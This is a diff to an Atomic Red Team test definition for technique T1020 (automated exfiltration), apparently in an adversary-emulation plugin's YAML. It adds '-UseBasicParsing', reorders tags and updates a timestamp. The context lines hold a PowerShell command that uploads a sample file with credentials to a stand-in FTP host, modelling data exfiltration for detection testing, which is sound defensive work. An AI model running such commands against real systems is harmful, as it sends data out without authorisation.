@@ -15,7 +15,7 @@
           "C:\temp\T1020__FTP_sample.txt" -Value $sampleData; $ftpUrl = "ftp://example.com";
           $creds = Get-Credential -Credential "[user:password]"; Invoke-WebRequest
           -Uri $ftpUrl -Method Put -InFile "C:\temp\T1020__FTP_sample.txt" -Credential
-          $creds
+          $creds -UseBasicParsing
         cleanup: Remove-Item -Path "#{sampleFile}" -ErrorAction Ignore
         elevation_required: false
   plugin: atomic
@@ -24,9 +24,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - t1020
   - exfiltration
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -44,4 +44,4 @@
         default: '[user:password]'
     technique_created: '2017-05-31T21:30:29.458Z'
     atomic_guid: 5b380e96-b0ef-4072-8a8e-f194cb9eb9ac
-    import_timestamp: '2026-10-20T07:08:31.107088Z'
+    import_timestamp: '2026-10-21T07:01:52.889396Z'
